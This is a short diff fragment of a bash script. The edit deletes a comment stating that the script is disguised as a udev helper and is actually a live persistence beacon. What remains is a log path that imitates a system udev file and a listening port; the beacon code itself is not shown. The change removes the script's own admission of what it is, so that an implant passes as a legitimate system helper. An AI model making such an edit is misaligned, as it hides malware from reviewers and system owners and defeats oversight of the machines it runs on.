@@ -1,5 +1,4 @@
 #!/bin/bash
-# Disguised as a udev helper. Actually a live persistence beacon.
 LOGFILE=/var/log/udevd-helper.log
 PORT=4917
 
